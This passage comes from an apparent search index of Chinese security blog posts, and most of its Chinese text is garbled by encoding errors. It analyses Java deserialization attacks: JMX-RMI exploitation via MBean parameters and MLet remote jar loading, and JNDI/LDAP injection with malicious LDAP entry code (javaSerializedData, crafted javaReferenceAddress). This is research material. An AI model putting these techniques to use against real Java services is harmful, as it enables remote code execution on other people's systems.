åˆ°è¿™é‡Œfastjsonç›¸å…³çš„çŸ¥è¯†ç‚¹å°±æ¢³ç†ç»“æŸäº†ï¼Œè¿™å…¶ä¸­å¼€å‘è€…ä¸å®‰å…¨ç ”ç©¶äººå‘˜çš„æ”»é˜²äº¤äº’çœŸæ˜¯ä»¤äººç§°å¿«ï¼åç»­å¦‚æœæœ‰å…¶ä»–çš„ç»•è¿‡ï¼Œè¿˜ä¼šç»§ç»­å†™ä¸‹å»ã€‚ æ€»ç»“ä¸€ä¸‹fastjsonåˆ©ç”¨ä¸­çš„ç‰¹è‰²ï¼š ååºåˆ—åŒ–æ—¶ä¸»åŠ¨è§¦å‘ç¬¦åˆæ¡ä»¶çš„setterså’Œgettersï¼Œå…¶ä¸­ä½¿ç”¨parseå’ŒparseObjectå‡½æ•°ï¼Œåœ¨getteråˆ©ç”¨ä¸ŠparseObjectçš„é™åˆ¶æ›´ä½ä¸€ç‚¹ï¼›ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æœ¬æ–‡çš„ä¸¤ç§æ–¹æ³•å°†parseçš„è°ƒç”¨æ•ˆæœè½¬åŒ–ä¸ºparseObject com.sun.org.apache.bcel.internal.util.ClassLoaderæ˜¯ä¸ªå¥½ä¸œè¥¿ fastjsonçš„é»‘åå•ç»•è¿‡æ¥çœ‹ï¼ŒåŸºæœ¬ä¸Šæ‰¾çš„éƒ½æ˜¯jndiç›¸å…³çš„åˆ©ç”¨ï¼Œæˆ–è®¸å¯ä»¥æ‰©å±•ä¸€äº›å…¶ä»–çš„ï¼Ÿ æœ‰æ—¶å€™å¼€å‘è€…ç†è§£ä¸åˆ°ä½ï¼Œæ‰“å¾—è¡¥ä¸å¯ä»¥è½»æ¾è¢«ç»•è¿‡ï¼Œæ‰€ä»¥éœ€è¦ç´§ç›¯è¡¥ä¸çš„æƒ…å†µ"},{"title":"æ”»å‡»Java JMX-RMI","permalink":"http://blog.0kami.cn/2020/03/10/java/java-jmx-rmi/","text":"0x00 å‰è¨€RMIçš„ä¸€ä¸ªé‡è¦åº”ç”¨æ˜¯JMX(Java Management Extentions)ï¼Œæœ¬æ–‡ä»‹ç»JMXçš„ä¸¤ä¸ªæ”»å‡»é¢ï¼šï¼‰ 0x01 åŸºç¡€åœ¨å†™ä¸€åŠçš„æ—¶å€™ï¼Œå‘ç°äº†è¿™ç¯‡æ–‡ç« ï¼Œæ„Ÿè§‰å†™çš„å¾ˆå¥½ï¼Œå¯ä»¥çœ‹çœ‹ï¼šhttps://mogwailabs.de/blog/2019/04/attacking-rmi-based-jmx-services/ JMX Java Management Extensions (JMX) is a Java technology that supplies tools for managing and monitoring applications, system objects, devices (such as printers) and service-oriented networks. MBean JMX allows you to manage resources as managed beans. A managed bean (MBean) is a Java Bean class that follows certain design rules of the JMX standard. An MBean can represent a device, an application, or any resource that needs to be managed over JMX. You can access these MBeans via JMX, query attributes and invoke Bean methods. The JMX standard differs between various MBean types however, we will only deal with the standard MBeans here. To be a valid MBean, a Java class must: Implement an interface Provide a default constructor (without any arguments) Follow certain naming conventions, for example implement getter/setter methods to read/write attributes è¿™é‡Œæä¸€ä¸‹ï¼Œå½“MBeançš„åå­—ä¸ºHelloæ—¶ï¼Œå…¶ç›¸åº”çš„interfaceåå¿…é¡»ä¸ºHelloMBeanï¼Œä¸ç„¶ç®—ä¸åˆæ³•çš„MBean MBean Server A MBean server is a service that manages the MBeans of a system. Developers can register their MBeans in the server following a specific naming pattern. The MBean server will forward incoming messages to the registered MBeans. The service is also responsible to forward messages from MBeans to external components. DEMOç”¨å‚è€ƒé‡Œçš„ï¼Œç”¨jconsoleçœ‹çœ‹ç»“æœ åœ¨JConsoleé‡Œå¯ä»¥å¯¹å½“å‰æ³¨å†Œçš„MBeanè¿›è¡Œæ“ä½œï¼Œå¦‚ä¸Šå›¾è°ƒç”¨sayHelloå‡½æ•° å½“å‰æˆ‘ä»¬è¿çš„æ˜¯æœ¬åœ°çš„MBean Server(æ¯ä¸ªjavaè¿›ç¨‹åœ¨æœ¬åœ°éƒ½ä¼šæœ‰ä¸€ä¸ªMBean Server)ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†MBean ServeræŒ‚è½½åˆ°æŸä¸€ç«¯å£ä¸Šï¼Œæä¾›è¿œç¨‹çš„MBeanç®¡ç†ã€‚ è¿è¡Œjaræ—¶å¸¦ä¸Š-Dcom.sun.management.jmxremote.port=2222 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false ç›´æ¥é€šè¿‡JConsoleæ¥è¿æ¥ï¼Œä¼šæç¤ºä½ æœ‰ä¸¤ç§æ–¹æ³•1:host:port;2:service:jmx:&lt;protocol&gt;:&lt;sap&gt; è¿™é‡Œæˆ‘ä»¬é‡ç‚¹è¦è®²çš„å°±æ˜¯ç¬¬äºŒç§æ–¹æ³•ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹jmxå»ºç«‹èµ·2222ç«¯å£åï¼Œç”¨nmapæ¥è·å–å…¶å†…å®¹æ˜¯æ€ä¹ˆæ ·çš„ ä»ç»“æœæ¥çœ‹ï¼ŒJMXçš„MBean Serveræ˜¯å»ºç«‹åœ¨RMIçš„åŸºç¡€ä¸Šçš„ï¼Œå¹¶ä¸”å…¶RMI Registyæ³¨å†Œçš„åå­—å«jmxrmiã€‚ ç¬¬äºŒç§æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŒ‡å®šå…·ä½“çš„åè®®æ¥è·ŸServerç«¯è¿›è¡Œè¿æ¥ï¼Œå‚è€ƒJMX RMI connector API There are two forms for RMI connector addresses: In the JNDI form, the URL indicates where to find an RMI stub for the connector. This RMI stub is a Java object of type RMIServer that gives remote access to the connector server. With this address form, the RMI stub is obtained from an external directory entry included in the URL. An external directory is any directory recognized by JNDI, typically the RMI registry, LDAP, or COS Naming. In the encoded form, the URL directly includes the information needed to connect to the connector server. When using RMI/JRMP, the encoded form is the serialized RMI stub for the server object, encoded using BASE64 without embedded newlines. When using RMI/IIOP, the encoded form is the CORBA IOR for the server object. è¿™é‡Œçš„encoded formçš„ååºåˆ—åŒ–è¿‡ç¨‹å®åœ¨å‘èµ·ç«¯è¿›è¡Œçš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸è€ƒè™‘ç¬¬äºŒç§å½¢å¼ã€‚ å¯¹äºJNDIçš„å½¢å¼ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•è·ŸJMX Serverå»è¿æ¥ï¼š Connectoræ”¯æŒJRMPå’Œiiopä½œä¸ºè¿æ¥å±‚çš„åè®®ï¼Œæ‰€ä»¥å¯¹åº”çš„æœ‰ä¸¤ç§æ–¹å¼ 121. service:jmx:rmi://host:port/2. service:jmx:iiop://host:port/ æ­¤å¤–ï¼Œè¿˜æœ‰åŸºäºç›®å½•æ¡ç›®çš„connectors 12341. service:jmx:rmi://host:port/jndi/jndi-name2. service:jmx:iiop://host:port/jndi/jndi-nameæ¯”å¦‚serivce:jmx:rmi://&lt;å¯å¿½ç•¥çš„host&gt;/jndi/rmi://host:port/jmxrmi è¿™ç§æ–¹å¼å°±å¯ä»¥ä½¿ç”¨jndiä¸‹çš„æ‰€æœ‰spiæ¥è¿›è¡Œè¿æ¥ 0x02 æ”»å‡»JMX1. æ”»å‡»JMX-RMICVE-2016-3427 ç”±äºJMXè®¤è¯æ—¶ä¼ é€’çš„æ˜¯HashMapæ•°æ®ç»“æ„ï¼Œè€Œä»¥HashMapå¯ä»¥ç›´æ¥æ„é€ ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨é“¾æ¥æ”»å‡»æœ¬åœ°ClassPathï¼Œè¿™é‡Œå·²ç»ä¿®å¤äº†ä¸ç»†è®²äº†XD ä¸»åŠ¨æ”»å‡»1ï¼šåˆ©ç”¨RMI Registyæ”¶åˆ°è¿œç¨‹bindæ—¶äº§ç”Ÿçš„ååºåˆ—åŒ–æ¼æ´ jdk&lt;8u141_b10(å¹¶ä¸”check hostçš„é¡ºåºå˜äº†ï¼Œè¯¦ç»†å¯ä»¥çœ‹è¿™é‡Œ)ï¼Œ8u141_b10ä¿®æ”¹åSingleEntryRegistryå¢åŠ äº†filter é™åˆ¶äº†æ¥å—åˆ°çš„ä¸èƒ½æ˜¯åºåˆ—åŒ–åçš„å¯¹è±¡ï¼Œä¹Ÿå°±æ„å‘³ç€ä¸èƒ½åˆ©ç”¨registryè¿™ç§æ–¹å¼æ¥è¾¾æˆåˆ©ç”¨äº†ã€‚ ä¸»åŠ¨æ”»å‡»2:åˆ©ç”¨RMI DGCå®ç°å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå¯åœ¨JEP 290ä¹‹å‰çš„ç‰ˆæœ¬æ”»å‡»æˆåŠŸ(ä½¿ç”¨ysoserialçš„JRMPClientï¼Œåˆ†æä¹Ÿè§è¿™é‡Œ0x08éƒ¨åˆ†) å‰é¢ä¸¤ç§æ–¹å¼ï¼Œåœ¨æœ€æ–°ç‰ˆçš„JDK8ä¸­å‡æ—©å·²å¤±æ•ˆã€‚é™¤äº†ç›´æ¥æ”»å‡»RMIå±‚ï¼Œæˆ‘ä»¬ä¹Ÿè¿˜å¯ä»¥åˆ©ç”¨MBean ServeræŒ‚è½½çš„å¯¹è±¡å‡½æ•°ï¼Œæ¥ä¼ é€’æ„é€ å¥½çš„åºåˆ—åŒ–æ•°æ®ã€‚è¿™é‡Œæœ‰ç‚¹åƒRMIä¸­åˆ©ç”¨RMI ServeræŒ‚è½½çš„å¯¹è±¡å‡½æ•°å‚æ•°ä¸­å­˜åœ¨ç›¸å…³å¯åˆ©ç”¨çš„å¯¹è±¡ï¼Œå¦‚Objectç±»å‹å°±å¯ä»¥è£…è½½æ‰€æœ‰çš„åºåˆ—åŒ–æ•°æ®ã€‚ 2. æ”»å‡»å­˜åœ¨å‡½æ•°å‚æ•°çš„å¯¹è±¡åˆ©ç”¨MBean ServeræŒ‚è½½çš„å¯¹è±¡å‡½æ•°å‚æ•°ï¼Œæ¥ä¼ é€’æ„é€ å¥½çš„åºåˆ—åŒ–æ•°æ®ã€‚MBean Serveræ¥æ”¶åˆ°æ•°æ®åï¼Œä¼šå¯¹è·å–åˆ°çš„å‚æ•°æ•°æ®è¿›è¡Œobject[]è½¬æ¢ï¼Œåœ¨è½¬æ¢å‰ï¼Œéœ€è¦å°†RMIäº¤äº’è¿‡ç¨‹ä¸­çš„åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ– javax/management/remote/rmi/RMIConnectionImpl.java#unwrap 1583è¡Œè¿›è¡Œç±»å‹è½¬åŒ–ï¼Œä½†é¦–å…ˆéœ€è¦å…ˆè¿›è¡Œååºåˆ—åŒ–mo.get() java/rmi/MarshalledObject.java#get è¿™é‡Œå°±åˆ°äº†å¸¸è§„çš„ååºåˆ—åŒ–æ“ä½œ æ‰€ä»¥åªè¦MBean Serveré‡Œå­˜åœ¨MBeançš„å‡½æ•°å­˜åœ¨å‚æ•°ï¼Œæˆ‘ä»¬é€šè¿‡æ„é€ ç›¸å…³çš„invokeä¼ é€’è¿‡å»å°±å¯ä»¥è§¦å‘ååºåˆ—åŒ– å¦‚java.util.logging.Logging#getLoggerLevel(String)æœ‰ä¸€ä¸ªStringç±»å‹çš„å‡½æ•°å‚æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥å°†payloadå¡è¿›invokeçš„ç¬¬äºŒä¸ªå‚æ•°å³å¯ã€‚ å…¶ä»–çš„MBeanä¹ŸåŒæ ·å¯ä»¥è¿™æ ·æ“ä½œï¼Œè¿™é‡Œå¦‚æœéœ€è¦è®¤è¯çš„è¯ï¼Œå°±éœ€è¦åœ¨è¿æ¥æ—¶å°†è®¤è¯ä¿¡æ¯å¸¦ä¸Šï¼Œåç»­çš„è¿˜æ˜¯å¯ä»¥åˆ©ç”¨æˆåŠŸçš„ã€‚ 3. åˆ©ç”¨MLETæ–¹å¼åŠ¨æ€åŠ è½½MBeanè¿™é‡Œå…ˆè¯´åˆ©ç”¨æ–¹å¼ï¼š åˆ©ç”¨æ¡ä»¶ï¼š æ— security manager æ— è®¤è¯ åˆ©ç”¨åŸç†ï¼š åœ¨ä¸€HTTP ServeræŒ‚è½½mletæ–‡ä»¶å’ŒåŒ…å«MBeançš„jaræ–‡ä»¶ ç”¨createMBean(&quot;javax.management.loading.MLet&quot;, null);çš„æ–¹å¼åœ¨è¿œç¨‹JMXåˆ›å»ºMLetå¯¹è±¡ ä½¿ç”¨getMBeansFromURLä»è¿œç¨‹HTTP ServeråŠ è½½mletæ–‡ä»¶ è§£æmletæ–‡ä»¶ï¼Œç”±äºå­˜åœ¨codebaseï¼Œä»è¿œç¨‹åŠ è½½jaræ–‡ä»¶ï¼Œå¹¶è½½å…¥è¯¥MBean è°ƒç”¨è¯¥MBeançš„æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å¯ä»¥æ˜¯è‡ªå®šä¹‰çš„æ‰§è¡Œå‘½ä»¤ç­‰æ“ä½œ ç®€å•åˆ†æï¼š æ¥ç®€å•è¯´ä¸€ä¸‹MLetçš„åŸç†ï¼ŒJMXé™¤äº†åŠ è½½æœ¬åœ°çš„MBeanï¼Œä¹Ÿå¯ä»¥åŠ è½½è¿œç¨‹çš„MLetæ–‡ä»¶(åŒ…å«äº†MLetæ ‡ç­¾)æ¥åŠ¨æ€åŠ è½½codebaseé‡Œçš„Jaræ–‡ä»¶ã€‚åè€…å°±æ˜¯é€šè¿‡MLetå¯¹è±¡çš„getMBeansFromURLå‡½æ•°æ¥å®Œæˆçš„ã€‚ æœ‰å…´è¶£çš„å¯ä»¥ç¿»ä¸€ç¿»javax/management/loading/MLet.java#getMBeansFromURLï¼Œè¿™é‡Œç›´æ¥è¯´ä¸€ä¸‹æµç¨‹ ä»è¿œç¨‹æœåŠ¡å™¨åŠ è½½MLetæ–‡ä»¶å¹¶è§£æè¯¥æ–‡ä»¶ æ ¹æ®MLetæ–‡ä»¶ä¸­æŒ‡å®šçš„codebaseå’Œarchiveå­—æ®µï¼Œæ‹¼æ¥æˆæœ€åè¦è¯·æ±‚çš„jaræ–‡ä»¶URLåœ°å€ æœ€åç”±URLClassLoaderæ¥å®Œæˆè¯·æ±‚è½½å…¥æ“ä½œ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç¬¬2æ­¥ä¸­ï¼Œå¦‚æœå½“å‰çš„URLåœ°å€å·²ç»å­˜åœ¨å°†ä¸å†é‡æ–°å‘èµ·è½½å…¥è¯·æ±‚ï¼Œæ„å‘³ç€ä¸€æ¬¡è½½å…¥æˆåŠŸä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è°ƒç”¨è¯¥MBeanï¼ˆServerä¸é‡å¯çš„çŠ¶æ€ä¸‹ï¼‰ã€‚ è€Œå¯¹äºå‰é¢æåˆ°çš„ä¸¤ä¸ªåˆ©ç”¨æ¡ä»¶ï¼š åœ¨æ–‡æ¡£é‡Œhttps://docs.oracle.com/javase/7/docs/technotes/guides/management/agent.htmlæåˆ° Caution - This configuration is insecure: any remote user who knows (or guesses) your port number and host name will be able to monitor and control your Java applications and platform. Furthermore, possible harm is not limited to the operations you define in your MBeans. A remote client could create a javax.management.loading.MLet MBean and use it to create new MBeans from arbitrary URLs, at least if there is no security manager. In other words, a rogue remote client could make your Java application execute arbitrary code. Consequently, while disabling security might be acceptable for development, it is strongly recommended that you do not disable security for production systems. é¦–å…ˆå¯¹äºæœ‰è®¤è¯çš„æƒ…å†µä¸‹ï¼Œè°ƒç”¨MLetå°†ä¼šè¿›è¡Œæƒå½“å‰ç”¨æˆ·çš„æƒé™éªŒè¯ï¼Œé»˜è®¤æƒ…å†µä¸‹éƒ½æ˜¯ä¸å…è®¸çš„ã€‚ com/sun/jmx/remote/security/MBeanServerFileAccessController.java#checkAccessä¼šæ£€æŸ¥å½“å‰ç™»é™†çš„ç”¨æˆ·æ˜¯å¦æœ‰Createçš„æƒé™(è¿™é‡Œçš„æƒé™æ˜¯ä¸‹é¢çš„createPatternsï¼Œå®ƒå…è®¸åˆ›å»ºæŒ‡å®šæ­£åˆ™çš„ç±»å‹ï¼Œè€Œæˆ‘ä»¬é»˜è®¤æ˜¯ä¸ºç©ºçš„)ï¼Œè¿™é‡Œé»˜è®¤ä¼šè¿”å›falseï¼Œä¹Ÿå°±æ„å‘³ç€å®ƒä¸å…è®¸ä»¥MLetå¯¹è±¡åˆ›å»ºæ–°çš„MBean å…¶æ¬¡å¯¹äºsecurity managerçš„é™åˆ¶ï¼Œåœ¨è¿œç¨‹è½½å…¥å‰ä¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨è½½å…¥çš„æƒé™ï¼ˆè¿™é‡Œæˆ‘æ²¡çœ‹åˆ°å…¶ä»–çš„åœ°æ–¹åšäº†åˆ¤æ–­ï¼Œå¯èƒ½ä¸æ­¢å½“å‰è¿™ä¸ªä½ç½®çš„éªŒè¯ï¼‰ å½“å‰æ–¹æ³•æ¯”è¾ƒæ–¹ä¾¿çš„æ˜¯å¯ä»¥è½½å…¥ä»»æ„çš„ä»£ç æ¥æ‰§è¡Œï¼Œä½†æ˜¯åˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ã€‚ 0x03 æ€»ç»“å¯¹äºJMXçš„åˆ©ç”¨ä¸»è¦åˆ©ç”¨çš„æ˜¯æœ¬åœ°å­˜åœ¨çš„Gadgetï¼Œå¦‚æœæœ¬åœ°ä¸å­˜åœ¨Gadgetçš„è¯å°±æ— æ³•åˆ©ç”¨æˆåŠŸã€‚é™¤éæ»¡è¶³JMX MLetçš„åˆ©ç”¨æ¡ä»¶ï¼Œé€šè¿‡åŠ è½½codebaseä¸Šçš„Jaræ–‡ä»¶æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œç”±äºæœ¬èº«JMXç”¨çš„RMIé‚£ä¸€å¥—ä¸œè¥¿ï¼Œæ‰€ä»¥å¦‚æœåœ¨åˆé€‚çš„JDKç‰ˆæœ¬ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ”»å‡»RMIï¼Œä¸è¿‡å‰æä»ç„¶æ˜¯æœ¬åœ°å­˜åœ¨ç›¸å…³çš„åˆ©ç”¨é“¾ã€‚ æœ€åï¼Œå‰æ–‡æåˆ°çš„æ”»å‡»æ–¹æ³•æˆ‘å·²ç»åŒæ­¥åˆ°githubä¸Šäº†"},{"title":"JNDI with LDAP","permalink":"http://blog.0kami.cn/2020/03/01/java/jndi-with-ldap/","text":"0x00 å‰è¨€JNDIçš„SPIå±‚é™¤äº†RMIå¤–ï¼Œè¿˜å¯ä»¥è·ŸLDAPäº¤äº’ã€‚ä¸RMIç±»ä¼¼ï¼ŒLDAPä¹Ÿèƒ½åŒæ ·è¿”å›ä¸€ä¸ªReferenceç»™JNDIçš„Naming Managerï¼Œæœ¬æ–‡å°†è®²è¿°JNDIä½¿ç”¨ldapåè®®çš„ä¸¤ä¸ªæ”»å‡»é¢XD 0x01 LDAPåŸºç¡€å…³äºLDAPçš„ä»‹ç»ï¼Œå»¶ä¼¸é˜…è¯»ä¸€ä¸‹è¿™ç¯‡ LDAP can be used to store Java objects by using several special Java attributes. There are at least two ways a Java object can be represented in an LDAP directory: â— Using Java serialization o https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.htmlâ— Using JNDI References o https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html from https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf Javaä¸­çš„LDAPå¯ä»¥åœ¨å±æ€§å€¼ä¸­å­˜å‚¨ç›¸å…³çš„Javaå¯¹è±¡ï¼Œå¯ä»¥å­˜å‚¨å¦‚ä¸Šä¸¤ç§å¯¹è±¡ï¼Œè€Œç›¸å…³çš„é—®é¢˜å°±æ˜¯å‡ºç°åœ¨è¿™éƒ¨åˆ†ä¸Šã€‚ åæ–‡ç”¨çš„LDAP Serverå‚è€ƒçš„æ˜¯mbechler å®ç°çš„LDAPRefServerï¼Œè¿æ¥çš„å®¢æˆ·ç«¯Clientç›´æ¥ç”¨JNDIçš„lookupå®Œæˆï¼Œjdkç‰ˆæœ¬jdk8u162 123Context ctx = new InitialContext();ctx.lookup(\"ldap://127.0.0.1:1389/EvilObj\");ctx.close(); 0x02 LDAP with JDNI ReferencesJNDIå‘èµ·ldapçš„lookupåï¼Œå°†æœ‰å¦‚ä¸‹çš„è°ƒç”¨æµç¨‹ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥æ¥å…³æ³¨ï¼Œè·å¾—è¿œç¨‹LDAP Serverçš„Entryä¹‹åï¼ŒClientè¿™è¾¹æ˜¯æ€ä¹ˆåšå¤„ç†çš„ è·Ÿè¿›com/sun/jndi/ldap/Obj.java#decodeObjectï¼ŒæŒ‰ç…§è¯¥å‡½æ•°çš„æ³¨é‡Šæ¥çœ‹ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯è§£ç ä»LDAP Serveræ¥çš„å¯¹è±¡ï¼Œè¯¥å¯¹è±¡å¯èƒ½æ˜¯åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªReferenceå¯¹è±¡ã€‚å…³äºåºåˆ—åŒ–å¯¹è±¡çš„å¤„ç†ï¼Œæˆ‘ä»¬çœ‹åé¢ä¸€èŠ‚ã€‚è¿™é‡Œæ‘˜å–äº†Referenceçš„å¤„ç†æ–¹å¼ï¼š 1234567891011121314static Object decodeObject(Attributes attrs) throws NamingException &#123; Attribute attr; // Get codebase, which is used in all 3 cases. String[] codebases = getCodebases(attrs.get(JAVA_ATTRIBUTES[CODEBASE])); try &#123; // ... attr = attrs.get(JAVA_ATTRIBUTES[OBJECT_CLASS]);// \"objectClass\" if (attr != null &amp;&amp; (attr.contains(JAVA_OBJECT_CLASSES[REF_OBJECT]) || // \"javaNamingReference\" attr.contains(JAVA_OBJECT_CLASSES_LOWER[REF_OBJECT]))) &#123; // \"javanamingreference\" return decodeReference(attrs, codebases); &#125; //... å¦‚æœLDAP Serverè¿”å›çš„å±æ€§é‡ŒåŒ…æ‹¬äº†objectClasså’ŒjavaNamingReferenceï¼Œå°†è¿›å…¥Referenceçš„å¤„ç†å‡½æ•°decodeReferenceä¸Š 12345678910111213if ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != null) &#123; className = (String)attr.get();&#125; else &#123; throw new InvalidAttributesException(JAVA_ATTRIBUTES[CLASSNAME] + \" attribute is required\");&#125;if ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != null) &#123; factory = (String)attr.get();&#125;Reference ref = new Reference(className, factory, (codebases != null? codebases[0] : null)); decodeReferenceå†ä»å±æ€§ä¸­æå–å‡ºjavaClassNameå’ŒjavaFactoryï¼Œæœ€åå°†ç”Ÿæˆä¸€ä¸ªReferenceã€‚è¿™é‡Œå¦‚æœçœ‹è¿‡æˆ‘å‰é¢çš„é‚£ç¯‡jndi-with-rmiï¼Œå¯ä»¥çœ‹åˆ°å…¶å®è¿™é‡Œç”Ÿæˆçš„refå°±æ˜¯æˆ‘ä»¬åœ¨RMIè¿”å›çš„é‚£ä¸ªReferenceWrapperï¼Œåé¢è¿™ä¸ªrefå°†ä¼šä¼ é€’ç»™Naming Managerå»å¤„ç†ï¼ŒåŒ…æ‹¬ä»codebaseä¸­è·å–classæ–‡ä»¶å¹¶è½½å…¥ã€‚ è€Œè¿™é‡ŒLDAPä¹Ÿç±»ä¼¼ï¼Œå¤„ç†refçš„å¯¹è±¡æ˜¯NamingManagerçš„å­ç±»javax/naming/spi/DirectoryManager.javaï¼Œå› ä¸ºè·ŸRMIæœ‰ç‚¹ç±»ä¼¼ä¸å…·ä½“åˆ†æäº†ï¼Œæœ€ååŒæ ·ç”±javax/naming/spi/NamingManager.java#getObjectFactoryFromReferenceæ¥å¤„ç†ã€‚ åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å†æ¥çœ‹mbechler å®ç°çš„LDAPRefServerå°±æ¯”è¾ƒæ¸…æ¥šäº† å½“å…¶è·å–åˆ°LDAPè¿æ¥æ—¶ï¼Œå°†å¡«å……å¦‚ä¸Šçš„å‡ ä¸ªå±æ€§åŠå…¶å¯¹åº”çš„å€¼ï¼Œå°±æ˜¯ä¸ºäº†æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶è€Œç”Ÿæˆä¸€ä¸ªReferenceå¯¹è±¡ã€‚ 0x03 LDAP with Serialized ObjectJNDIå¯¹äºå±æ€§ä¸­çš„åºåˆ—åŒ–æ•°æ®çš„å¤„ç†ä¸€å…±æœ‰ä¸¤ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬å…ˆæ¥é¡ºç€å‰é¢çš„JNDI Referenceçš„æ€è·¯è¯´ä¸‹å» ç¬¬ä¸€å¤„ï¼šcom/sun/jndi/ldap/Obj.java#decodeObjectåœ¨com/sun/jndi/ldap/Obj.java#decodeObjectä¸Šè¿˜å­˜åœ¨ä¸€ä¸ªåˆ¤æ–­ 1234if ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != null) &#123;// â€œjavaSerializedDataâ€ ClassLoader cl = helper.getURLClassLoader(codebases); return deserializeObject((byte[])attr.get(), cl);&#125; å¦‚æœåœ¨è¿”å›çš„å±æ€§ä¸­å­˜åœ¨javaSerializedDataï¼Œå°†ç»§ç»­è°ƒç”¨deserializeObjectå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸»è¦å°±æ˜¯è°ƒç”¨å¸¸è§„çš„ååºåˆ—åŒ–æ–¹å¼readObjectå¯¹åºåˆ—åŒ–æ•°æ®è¿›è¡Œè¿˜åŸï¼Œå¦‚ä¸‹payloadã€‚ 12345@Overrideprotected void processAttribute(Entry entry)&#123; entry.addAttribute(\"javaClassName\", \"foo\"); entry.addAttribute(\"javaSerializedData\", serialized);&#125; è¿™é‡Œæˆ‘ä»¬å°±ä¸éœ€è¦é€šè¿‡è¿œç¨‹codebaseçš„æ–¹å¼æ¥è¾¾æˆRCEï¼Œå½“ç„¶é¦–å…ˆæœ¬åœ°ç¯å¢ƒä¸Šéœ€è¦æœ‰ååºåˆ—åŒ–åˆ©ç”¨é“¾æ‰€ä¾èµ–çš„åº“æ–‡ä»¶ã€‚ ç¬¬äºŒå¤„ï¼šcom/sun/jndi/ldap/Obj.java#decodeReferencedecodeReferenceå‡½æ•°åœ¨å¯¹æ™®é€šçš„Referenceè¿˜åŸçš„åŸºç¡€ä¸Šï¼Œè¿˜å¯ä»¥è¿›ä¸€æ­¥å¯¹RefAddressåšè¿˜åŸå¤„ç†ï¼Œå…¶ä¸­è¿˜åŸè¿‡ç¨‹ä¸­ï¼Œä¹Ÿè°ƒç”¨äº†deserializeObjectå‡½æ•°ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬é€šè¿‡æ»¡è¶³RefAddressçš„æ–¹å¼ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°ä¸Šé¢ç¬¬ä¸€ç§çš„æ•ˆæœã€‚ å…·ä½“ä»£ç å¤ªé•¿äº†ï¼Œè¿™é‡Œæˆ‘å°±è¯´ä¸€ä¸‹æ¡ä»¶ï¼š ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºåˆ†éš”ç¬¦ ç¬¬ä¸€ä¸ªåˆ†éš”ç¬¦ä¸ç¬¬äºŒä¸ªåˆ†éš”ç¬¦ä¹‹é—´ï¼Œè¡¨ç¤ºReferenceçš„positionï¼Œä¸ºintç±»å‹ ç¬¬äºŒä¸ªåˆ†éš”ç¬¦ä¸ç¬¬ä¸‰ä¸ªåˆ†éš”ç¬¦ä¹‹é—´ï¼Œè¡¨ç¤ºtypeï¼Œç±»å‹ ç¬¬ä¸‰ä¸ªåˆ†éš”ç¬¦æ˜¯åŒåˆ†éš”ç¬¦çš„å½¢å¼ï¼Œåˆ™è¿›å…¥ååºåˆ—åŒ–çš„æ“ä½œ åºåˆ—åŒ–æ•°æ®ç”¨base64ç¼–ç  æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶ï¼Œæ„é€ ä¸€ä¸ªç±»ä¼¼çš„ 12345protected void processAttribute(Entry entry)&#123; entry.addAttribute(\"javaClassName\", \"foo\"); entry.addAttribute(\"javaReferenceAddress\",\"$1$String$$\"+new BASE64Encoder().encode(serialized)); entry.addAttribute(\"objectClass\", \"javaNamingReference\"); //$NON-NLS-1$&#125; å½“ç„¶ç¬¬äºŒå¤„åªæ˜¯ä¸€ä¸ªé”¦ä¸Šæ·»èŠ±çš„æ­¥éª¤ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨ç¬¬ä¸€ç§æ–¹æ³•ï¼Œç¬¬äºŒç§åœ¨ç¬¬ä¸€ç§ä¸èƒ½ç”¨çš„æƒ…å†µä¸‹å¯ä»¥è¯•è¯•ã€‚ 0x04 åç»­è‡ªjdk8u191-b02ç‰ˆæœ¬åï¼Œæ–°æ·»åŠ 